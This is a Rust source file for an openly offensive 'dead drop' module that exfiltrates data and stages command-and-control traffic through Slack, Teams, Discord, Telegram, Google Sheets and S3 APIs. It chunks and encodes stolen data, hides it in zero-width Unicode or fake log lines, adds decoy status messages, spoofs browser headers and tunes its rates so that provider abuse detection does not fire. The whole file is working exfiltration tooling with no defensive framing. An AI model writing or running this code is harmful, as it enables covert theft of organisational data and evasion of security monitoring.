use std::collections::HashMap;

use rand::rngs::StdRng;
use rand::Rng;
use rand::SeedableRng;
use serde::{Deserialize, Serialize};

/// SaaS provider used as a C2/staging dead drop.
///
/// Each variant maps to a legitimate SaaS API endpoint that employees
/// routinely access. Tokens are indistinguishable from normal employee usage
/// because they use the same OAuth/API key authentication mechanisms.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum SaasProvider {
    SlackWebhook,
    TeamsConnector,
    S3Presigned,
    GoogleSheets,
    DiscordWebhook,
    TelegramBot,
}

impl SaasProvider {
    /// Base API endpoint for the provider.
    pub fn api_base(&self) -> &'static str {
        match self {
            Self::SlackWebhook => "https://hooks.slack.com/services",
            Self::TeamsConnector => "https://outlook.office.com/webhook",
            Self::S3Presigned => "https://s3.amazonaws.com",
            Self::GoogleSheets => "https://sheets.googleapis.com/v4/spreadsheets",
            Self::DiscordWebhook => "https://discord.com/api/webhooks",
            Self::TelegramBot => "https://api.telegram.org/bot",
        }
    }

    /// Content-Type header appropriate for the provider's API.
    pub fn content_type(&self) -> &'static str {
        match self {
            Self::SlackWebhook => "application/json",
            Self::TeamsConnector => "application/json",
            Self::S3Presigned => "application/octet-stream",
            Self::GoogleSheets => "application/json",
            Self::DiscordWebhook => "application/json",
            Self::TelegramBot => "application/json",
        }
    }

    /// Maximum single message/upload size in bytes.
    pub fn max_message_size(&self) -> usize {
        match self {
            Self::SlackWebhook => 40_000,
            Self::TeamsConnector => 28_000,
            Self::S3Presigned => 5_368_709_120, // 5 GB
            Self::GoogleSheets => 50_000,
            Self::DiscordWebhook => 8_000,
            Self::TelegramBot => 4_096,
        }
    }

    /// Recommended chunk size for multi-part uploads.
    pub fn recommended_chunk_size(&self) -> usize {
        match self {
            Self::SlackWebhook => 3_000,
            Self::TeamsConnector => 2_500,
            Self::S3Presigned => 1_048_576, // 1 MB
            Self::GoogleSheets => 4_000,
            Self::DiscordWebhook => 1_800,
            Self::TelegramBot => 3_500,
        }
    }

    /// Rate limit (requests per minute) to avoid triggering provider abuse detection.
    pub fn safe_rate_limit_rpm(&self) -> u32 {
        match self {
            Self::SlackWebhook => 1,
            Self::TeamsConnector => 4,
            Self::S3Presigned => 100,
            Self::GoogleSheets => 60,
            Self::DiscordWebhook => 5,
            Self::TelegramBot => 20,
        }
    }
}

/// Authentication token configuration for a SaaS provider.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SaasCredential {
    pub provider: SaasProvider,
    pub token: String,
    pub channel_id: Option<String>,
    pub workspace_id: Option<String>,
    pub extra_params: HashMap<String, String>,
}

impl SaasCredential {
    pub fn new(provider: SaasProvider, token: &str) -> Self {
        Self {
            provider,
            token: token.to_string(),
            channel_id: None,
            workspace_id: None,
            extra_params: HashMap::new(),
        }
    }

    pub fn with_channel_id(mut self, id: &str) -> Self {
        self.channel_id = Some(id.to_string());
        self
    }

    pub fn with_workspace_id(mut self, id: &str) -> Self {
        self.workspace_id = Some(id.to_string());
        self
    }

    pub fn with_param(mut self, key: &str, value: &str) -> Self {
        self.extra_params.insert(key.to_string(), value.to_string());
        self
    }
}

/// Encoding scheme for embedding data in SaaS message fields.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum MessageEncoding {
    /// Base64 in a text/message field.
    Base64Text,
    /// Hex-encoded split across multiple fields.
    HexMultiField,
    /// Unicode steganography using zero-width characters.
    ZeroWidthUnicode,
    /// Encoded as fake error/log messages.
    FakeLogMessages,
}

/// Configuration for a dead drop channel.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeadDropConfig {
    pub credential: SaasCredential,
    pub encoding: MessageEncoding,
    pub chunk_size: usize,
    pub add_cover_messages: bool,
    pub cover_message_ratio: f64,
    pub min_interval_ms: u64,
    pub max_interval_ms: u64,
}

impl DeadDropConfig {
    pub fn new(credential: SaasCredential) -> Self {
        let chunk_size = credential.provider.recommended_chunk_size();
        Self {
            credential,
            encoding: MessageEncoding::Base64Text,
            chunk_size,
            add_cover_messages: true,
            cover_message_ratio: 0.3,
            min_interval_ms: 5000,
            max_interval_ms: 30000,
        }
    }

    pub fn with_encoding(mut self, enc: MessageEncoding) -> Self {
        self.encoding = enc;
        self
    }

    pub fn with_chunk_size(mut self, size: usize) -> Self {
        self.chunk_size = size;
        self
    }

    pub fn with_cover_messages(mut self, enabled: bool, ratio: f64) -> Self {
        self.add_cover_messages = enabled;
        self.cover_message_ratio = ratio.clamp(0.0, 1.0);
        self
    }

    pub fn with_interval(mut self, min_ms: u64, max_ms: u64) -> Self {
        self.min_interval_ms = min_ms;
        self.max_interval_ms = max_ms;
        self
    }
}

/// A prepared dead drop message ready for transmission.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DeadDropMessage {
    pub provider: SaasProvider,
    pub endpoint_url: String,
    pub method: String,
    pub headers: HashMap<String, String>,
    pub body: String,
    pub sequence: usize,
    pub total_chunks: usize,
    pub session_tag: String,
    pub is_cover: bool,
    pub payload_bytes: usize,
}

/// Error type for dead drop operations.
#[derive(Debug)]
pub enum DeadDropError {
    PayloadTooLarge { size: usize, max: usize },
    EncodingFailed(String),
    DecodingFailed(String),
    InvalidCredential(String),
    RateLimitExceeded { provider: SaasProvider, rpm: u32 },
}

impl std::fmt::Display for DeadDropError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::PayloadTooLarge { size, max } => {
                write!(f, "payload {size} bytes exceeds provider max {max}")
            }
            Self::EncodingFailed(e) => write!(f, "encoding failed: {e}"),
            Self::DecodingFailed(e) => write!(f, "decoding failed: {e}"),
            Self::InvalidCredential(e) => write!(f, "invalid credential: {e}"),
            Self::RateLimitExceeded { provider, rpm } => {
                write!(f, "{provider:?} rate limit {rpm} rpm exceeded")
            }
        }
    }
}

impl std::error::Error for DeadDropError {}

/// Uses authorized SaaS APIs as C2/staging dead drops.
///
/// Messages encoded and chunked through Slack webhooks, Teams connectors,
/// S3 presigned URLs, Google Sheets API, Discord webhooks, or Telegram bot
/// API. Authenticated with tokens indistinguishable from employee usage.
/// Cover messages interspersed to maintain normal-looking channel activity.
pub struct SaasDeadDrop {
    config: DeadDropConfig,
    rng: StdRng,
    session_tag: String,
    messages_sent: u64,
    bytes_exfiltrated: u64,
    cover_messages_sent: u64,
}

impl SaasDeadDrop {
    pub fn new(config: DeadDropConfig) -> Self {
        let mut rng = StdRng::from_os_rng();
        let session_tag = format!("dd-{:08x}", rng.random::<u32>());
        Self {
            config,
            rng,
            session_tag,
            messages_sent: 0,
            bytes_exfiltrated: 0,
            cover_messages_sent: 0,
        }
    }

    pub fn with_seed(config: DeadDropConfig, seed: u64) -> Self {
        let mut rng = StdRng::seed_from_u64(seed);
        let session_tag = format!("dd-{:08x}", rng.random::<u32>());
        Self {
            config,
            rng,
            session_tag,
            messages_sent: 0,
            bytes_exfiltrated: 0,
            cover_messages_sent: 0,
        }
    }

    /// Encodes and chunks a payload into dead drop messages ready for
    /// transmission through the configured SaaS provider.
    pub fn prepare_exfil(&mut self, data: &[u8]) -> Result<Vec<DeadDropMessage>, DeadDropError> {
        if data.is_empty() {
            return Ok(Vec::new());
        }

        let encoded = self.encode_data(data)?;
        let chunks: Vec<String> = encoded
            .as_bytes()
            .chunks(self.config.chunk_size)
            .map(|c| String::from_utf8_lossy(c).to_string())
            .collect();

        let total = chunks.len();
        let mut messages = Vec::with_capacity(total * 2);

        for (i, chunk) in chunks.into_iter().enumerate() {
            let msg = self.build_message(chunk, i, total, false)?;
            self.messages_sent += 1;
            self.bytes_exfiltrated += data.len().min(self.config.chunk_size) as u64;
            messages.push(msg);

            // Intersperse cover messages
            if self.config.add_cover_messages {
                let roll: f64 = self.rng.random_range(0.0..1.0);
                if roll < self.config.cover_message_ratio {
                    let cover = self.generate_cover_message()?;
                    self.cover_messages_sent += 1;
                    messages.push(cover);
                }
            }
        }

        Ok(messages)
    }

    /// Decodes a sequence of dead drop messages back into the original payload.
    pub fn decode_messages(&self, messages: &[DeadDropMessage]) -> Result<Vec<u8>, DeadDropError> {
        let mut data_msgs: Vec<&DeadDropMessage> =
            messages.iter().filter(|m| !m.is_cover).collect();
        data_msgs.sort_by_key(|m| m.sequence);

        let combined: String = data_msgs.iter().map(|m| m.body.as_str()).collect();
        self.decode_data(&combined)
    }

    /// Generates a standalone cover message that looks like normal channel activity.
    pub fn generate_cover_message(&mut self) -> Result<DeadDropMessage, DeadDropError> {
        let cover_texts = match self.config.credential.provider {
            SaasProvider::SlackWebhook => vec![
                "Build #4521 passed - all tests green",
                "Deployment to staging complete",
                "PR #892 merged into main",
                "CPU alert resolved - back to normal",
                "Daily backup completed successfully",
                "Sprint velocity: 42 points completed",
            ],
            SaasProvider::TeamsConnector => vec![
                "Meeting notes uploaded to SharePoint",
                "Q4 review deck shared with team",
                "Jira tickets updated for sprint 23",
                "Infrastructure cost report generated",
                "Weekly standup summary posted",
                "Release notes for v2.3.1 published",
            ],
            SaasProvider::DiscordWebhook => vec![
                "Server backup completed",
                "New version deployed to production",
                "Monitoring alert cleared",
                "Build pipeline status: healthy",
                "Database migration completed",
                "CDN cache purged successfully",
            ],
            SaasProvider::TelegramBot => vec![
                "System health check: OK",
                "Automated report generated",
                "Schedule task completed",
                "Data sync finished",
                "Alert: resolved automatically",
                "Backup verification passed",
            ],
            _ => vec![
                "Automated process completed",
                "Status: healthy",
                "Task finished successfully",
            ],
        };

        let idx = self.rng.random_range(0..cover_texts.len());
        let text = cover_texts[idx];
        let body = self.format_provider_body(text);

        Ok(DeadDropMessage {
            provider: self.config.credential.provider,
            endpoint_url: self.build_endpoint_url(),
            method: self.provider_method().to_string(),
            headers: self.build_headers(),
            body,
            sequence: 0,
            total_chunks: 1,
            session_tag: self.session_tag.clone(),
            is_cover: true,
            payload_bytes: 0,
        })
    }

    /// Returns the next inter-message delay in milliseconds.
    pub fn next_delay_ms(&mut self) -> u64 {
        self.rng
            .random_range(self.config.min_interval_ms..=self.config.max_interval_ms)
    }

    pub fn messages_sent(&self) -> u64 {
        self.messages_sent
    }

    pub fn bytes_exfiltrated(&self) -> u64 {
        self.bytes_exfiltrated
    }

    pub fn cover_messages_sent(&self) -> u64 {
        self.cover_messages_sent
    }

    pub fn session_tag(&self) -> &str {
        &self.session_tag
    }

    pub fn provider(&self) -> SaasProvider {
        self.config.credential.provider
    }

    pub fn config(&self) -> &DeadDropConfig {
        &self.config
    }

    fn encode_data(&self, data: &[u8]) -> Result<String, DeadDropError> {
        match self.config.encoding {
            MessageEncoding::Base64Text => Ok(base64_encode_saas(data)),
            MessageEncoding::HexMultiField => Ok(hex_encode_saas(data)),
            MessageEncoding::ZeroWidthUnicode => Ok(zero_width_encode(data)),
            MessageEncoding::FakeLogMessages => Ok(fake_log_encode(data)),
        }
    }

    fn decode_data(&self, encoded: &str) -> Result<Vec<u8>, DeadDropError> {
        match self.config.encoding {
            MessageEncoding::Base64Text => base64_decode_saas(encoded),
            MessageEncoding::HexMultiField => hex_decode_saas(encoded),
            MessageEncoding::ZeroWidthUnicode => zero_width_decode(encoded),
            MessageEncoding::FakeLogMessages => fake_log_decode(encoded),
        }
    }

    fn build_message(
        &mut self,
        encoded_chunk: String,
        sequence: usize,
        total: usize,
        is_cover: bool,
    ) -> Result<DeadDropMessage, DeadDropError> {
        let body = self.format_provider_body(&encoded_chunk);

        Ok(DeadDropMessage {
            provider: self.config.credential.provider,
            endpoint_url: self.build_endpoint_url(),
            method: self.provider_method().to_string(),
            headers: self.build_headers(),
            body,
            sequence,
            total_chunks: total,
            session_tag: self.session_tag.clone(),
            is_cover,
            payload_bytes: encoded_chunk.len(),
        })
    }

    fn build_endpoint_url(&self) -> String {
        let base = self.config.credential.provider.api_base();
        let token = &self.config.credential.token;

        match self.config.credential.provider {
            SaasProvider::SlackWebhook => format!("{base}/{token}"),
            SaasProvider::TeamsConnector => format!("{base}/{token}"),
            SaasProvider::S3Presigned => format!("{base}/{token}"),
            SaasProvider::GoogleSheets => {
                let sheet_id = self
                    .config
                    .credential
                    .channel_id
                    .as_deref()
                    .unwrap_or("default");
                format!("{base}/{sheet_id}/values/A1:append?key={token}")
            }
            SaasProvider::DiscordWebhook => format!("{base}/{token}"),
            SaasProvider::TelegramBot => {
                let chat_id = self.config.credential.channel_id.as_deref().unwrap_or("0");
                format!("{base}{token}/sendMessage?chat_id={chat_id}")
            }
        }
    }

    fn provider_method(&self) -> &'static str {
        match self.config.credential.provider {
            SaasProvider::S3Presigned => "PUT",
            _ => "POST",
        }
    }

    fn build_headers(&self) -> HashMap<String, String> {
        let mut headers = HashMap::new();
        let ct = self.config.credential.provider.content_type();
        headers.insert("Content-Type".to_string(), ct.to_string());

        match self.config.credential.provider {
            SaasProvider::GoogleSheets => {
                headers.insert(
                    "Authorization".to_string(),
                    format!("Bearer {}", self.config.credential.token),
                );
            }
            SaasProvider::TelegramBot => {}
            SaasProvider::SlackWebhook | SaasProvider::DiscordWebhook => {}
            SaasProvider::TeamsConnector => {}
            SaasProvider::S3Presigned => {
                headers.insert("x-amz-acl".to_string(), "private".to_string());
            }
        }

        // Add browser-like headers for blending
        headers.insert(
            "User-Agent".to_string(),
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".to_string(),
        );
        headers.insert("Accept".to_string(), "*/*".to_string());

        headers
    }

    fn format_provider_body(&self, content: &str) -> String {
        match self.config.credential.provider {
            SaasProvider::SlackWebhook => {
                format!("{{\"text\":\"{}\"}}", escape_json(content))
            }
            SaasProvider::TeamsConnector => {
                format!(
                    "{{\"@type\":\"MessageCard\",\"text\":\"{}\"}}",
                    escape_json(content)
                )
            }
            SaasProvider::S3Presigned => content.to_string(),
            SaasProvider::GoogleSheets => {
                format!(
                    "{{\"values\":[[\"{}\"]],\"majorDimension\":\"ROWS\"}}",
                    escape_json(content)
                )
            }
            SaasProvider::DiscordWebhook => {
                format!("{{\"content\":\"{}\"}}", escape_json(content))
            }
            SaasProvider::TelegramBot => {
                format!("{{\"text\":\"{}\"}}", escape_json(content))
            }
        }
    }
}

/// Multi-provider dead drop manager that distributes exfil across multiple
/// SaaS channels for resilience and reduced per-channel volume.
pub struct MultiChannelDeadDrop {
    channels: Vec<SaasDeadDrop>,
    round_robin_idx: usize,
}

impl MultiChannelDeadDrop {
    pub fn new(configs: Vec<DeadDropConfig>) -> Self {
        let channels = configs.into_iter().map(SaasDeadDrop::new).collect();
        Self {
            channels,
            round_robin_idx: 0,
        }
    }

    /// Distributes a payload across channels in round-robin order.
    pub fn exfil(&mut self, data: &[u8]) -> Result<Vec<DeadDropMessage>, DeadDropError> {
        if self.channels.is_empty() {
            return Err(DeadDropError::InvalidCredential(
                "no channels configured".to_string(),
            ));
        }
        let idx = self.round_robin_idx % self.channels.len();
        self.round_robin_idx += 1;
        self.channels[idx].prepare_exfil(data)
    }

    pub fn channel_count(&self) -> usize {
        self.channels.len()
    }

    /// Returns per-channel statistics.
    pub fn stats(&self) -> Vec<(SaasProvider, u64, u64)> {
        self.channels
            .iter()
            .map(|c| (c.provider(), c.messages_sent(), c.bytes_exfiltrated()))
            .collect()
    }
}

// --- Encoding helpers ---

fn base64_encode_saas(data: &[u8]) -> String {
    const TABLE: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::with_capacity((data.len() + 2) / 3 * 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;
        result.push(TABLE[((triple >> 18) & 0x3F) as usize] as char);
        result.push(TABLE[((triple >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            result.push(TABLE[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
        if chunk.len() > 2 {
            result.push(TABLE[(triple & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
    }
    result
}

fn base64_decode_saas(encoded: &str) -> Result<Vec<u8>, DeadDropError> {
    let mut result = Vec::new();
    let chars: Vec<u8> = encoded.bytes().filter(|&b| b != b'=').collect();
    let decode_char = |c: u8| -> Result<u32, DeadDropError> {
        match c {
            b'A'..=b'Z' => Ok((c - b'A') as u32),
            b'a'..=b'z' => Ok((c - b'a' + 26) as u32),
            b'0'..=b'9' => Ok((c - b'0' + 52) as u32),
            b'+' => Ok(62),
            b'/' => Ok(63),
            _ => Err(DeadDropError::DecodingFailed(format!(
                "invalid base64 char: {}",
                c as char
            ))),
        }
    };
    let mut i = 0;
    while i + 1 < chars.len() {
        let a = decode_char(chars[i])?;
        let b = decode_char(chars[i + 1])?;
        let c = if i + 2 < chars.len() {
            decode_char(chars[i + 2])?
        } else {
            0
        };
        let d = if i + 3 < chars.len() {
            decode_char(chars[i + 3])?
        } else {
            0
        };
        let triple = (a << 18) | (b << 12) | (c << 6) | d;
        result.push((triple >> 16) as u8);
        if i + 2 < chars.len() {
            result.push((triple >> 8) as u8);
        }
        if i + 3 < chars.len() {
            result.push(triple as u8);
        }
        i += 4;
    }
    Ok(result)
}

fn hex_encode_saas(data: &[u8]) -> String {
    data.iter().map(|b| format!("{b:02x}")).collect()
}

fn hex_decode_saas(encoded: &str) -> Result<Vec<u8>, DeadDropError> {
    if encoded.len() % 2 != 0 {
        return Err(DeadDropError::DecodingFailed("odd hex length".to_string()));
    }
    let bytes = encoded.as_bytes();
    let mut result = Vec::with_capacity(encoded.len() / 2);
    for i in (0..bytes.len()).step_by(2) {
        let hi = hex_nibble_saas(bytes[i])?;
        let lo = hex_nibble_saas(bytes[i + 1])?;
        result.push((hi << 4) | lo);
    }
    Ok(result)
}

fn hex_nibble_saas(c: u8) -> Result<u8, DeadDropError> {
    match c {
        b'0'..=b'9' => Ok(c - b'0'),
        b'a'..=b'f' => Ok(c - b'a' + 10),
        b'A'..=b'F' => Ok(c - b'A' + 10),
        _ => Err(DeadDropError::DecodingFailed(format!(
            "invalid hex char: {}",
            c as char
        ))),
    }
}

/// Encodes data using zero-width Unicode characters for steganographic hiding.
fn zero_width_encode(data: &[u8]) -> String {
    let mut result = String::new();
    for &byte in data {
        for bit_pos in (0..8).rev() {
            if (byte >> bit_pos) & 1 == 1 {
                result.push('\u{200B}'); // zero-width space = 1
            } else {
                result.push('\u{200C}'); // zero-width non-joiner = 0
            }
        }
        result.push('\u{200D}'); // zero-width joiner = byte separator
    }
    result
}

fn zero_width_decode(encoded: &str) -> Result<Vec<u8>, DeadDropError> {
    let mut result = Vec::new();
    let mut current_byte: u8 = 0;
    let mut bit_count = 0;

    for c in encoded.chars() {
        match c {
            '\u{200B}' => {
                current_byte = (current_byte << 1) | 1;
                bit_count += 1;
            }
            '\u{200C}' => {
                current_byte <<= 1;
                bit_count += 1;
            }
            '\u{200D}' => {
                if bit_count > 0 {
                    result.push(current_byte);
                    current_byte = 0;
                    bit_count = 0;
                }
            }
            _ => {} // skip non-encoding characters
        }
        if bit_count >= 8 {
            result.push(current_byte);
            current_byte = 0;
            bit_count = 0;
        }
    }
    Ok(result)
}

/// Encodes data as fake log/error messages.
fn fake_log_encode(data: &[u8]) -> String {
    let prefixes = [
        "INFO  [health-check]",
        "DEBUG [metrics-collector]",
        "TRACE [session-manager]",
        "INFO  [cache-warmer]",
        "DEBUG [task-scheduler]",
    ];
    let mut result = String::new();
    for (i, chunk) in data.chunks(16).enumerate() {
        let prefix = prefixes[i % prefixes.len()];
        let hex: String = chunk.iter().map(|b| format!("{b:02x}")).collect();
        result.push_str(&format!("{prefix} session={hex}\n"));
    }
    result
}

fn fake_log_decode(encoded: &str) -> Result<Vec<u8>, DeadDropError> {
    let mut result = Vec::new();
    for line in encoded.lines() {
        if let Some(hex_part) = line.split("session=").nth(1) {
            let hex_str = hex_part.trim();
            if hex_str.len() % 2 != 0 {
                continue;
            }
            let bytes = hex_str.as_bytes();
            for i in (0..bytes.len()).step_by(2) {
                if i + 1 < bytes.len() {
                    let hi = hex_nibble_saas(bytes[i])
                        .map_err(|_| DeadDropError::DecodingFailed("bad hex in log".to_string()))?;
                    let lo = hex_nibble_saas(bytes[i + 1])
                        .map_err(|_| DeadDropError::DecodingFailed("bad hex in log".to_string()))?;
                    result.push((hi << 4) | lo);
                }
            }
        }
    }
    Ok(result)
}

fn escape_json(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
        .replace('\t', "\\t")
}
